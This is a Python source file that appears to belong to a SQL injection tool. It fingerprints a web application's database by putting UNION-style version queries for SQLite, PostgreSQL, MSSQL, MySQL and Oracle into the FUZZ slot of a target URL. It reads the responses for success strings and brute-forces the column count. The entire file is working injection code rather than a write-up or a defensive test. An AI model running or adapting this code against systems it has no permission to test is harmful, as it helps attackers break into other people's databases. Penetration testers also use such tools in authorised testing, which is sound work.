from enum import Enum
from requests import request


class State(Enum):
    Error = 0
    Success = 1
    Ambiguous = 2


class DBMS_Type(Enum):
    AMBIGUOUS = 0
    SQLITE = 1
    POSTGRESQL = 2
    MSSQL = 3
    MYSQL = 4
    ORACLESQL = 5
    SQLSERVER = 6


class DBMS_VERSION_STRING(Enum):
    SQLITE = 'SELECT sqlite_version()'
    # TODO: make this 'not shitty' by specifying differnt cast types
    POSTGRESQL = r"SELECT (regexp_match(version(), '\d+'))[1]::int"
    MSSQL = 'SELECT @@VERSION()'
    MYSQL = 'SELECT VERSION()'
    ORACLESQL = 'SELECT v$version'
    SQLSERVER = 'SELECT @@VERSION()'


def determine_dbms(opts, poison, columns=1, brute_force=False):
    sql_version = None
    brute_force_limit = 20

    if brute_force and brute_force_limit <= columns:
        return None

    for version_string in DBMS_VERSION_STRING:
        if sql_version is not None:
            break

        nulls = "".join([",null" for _ in range(0, columns-1)])
        poison_str = poison + version_string.value + nulls + "; -- "

        target = opts.URL.replace("FUZZ", poison_str)
        result = request("get", target).text

        if opts.SUCCESS_STR in result and opts.ERROR_STR in result:
            sql_version = DBMS_Type.AMBIGUOUS
        elif opts.SUCCESS_STR in result:
            sql_version = DBMS_Type[version_string.name]
            break

        # Postgres Specific case, brute force all type casts to match
        if version_string is DBMS_VERSION_STRING.POSTGRESQL:
            possible_casts = [
                r"SELECT version()::text"
            ]

            for possible_cast in possible_casts:
                nulls = "".join([",null" for _ in range(0, columns-1)])
                poison_str = poison + possible_cast + nulls + ";--"

                target = opts.URL.replace("FUZZ", poison_str)
                result = request("get", target).text

                if opts.SUCCESS_STR in result and opts.ERROR_STR in result:
                    sql_version = DBMS_Type.AMBIGUOUS
                elif opts.SUCCESS_STR in result:
                    sql_version = DBMS_Type.POSTGRESQL
                    break

    if brute_force and sql_version is None:
        return determine_dbms(opts, poison, columns + 1, True)

    # update correct column size
    opts.COLUMNS = columns

    return sql_version
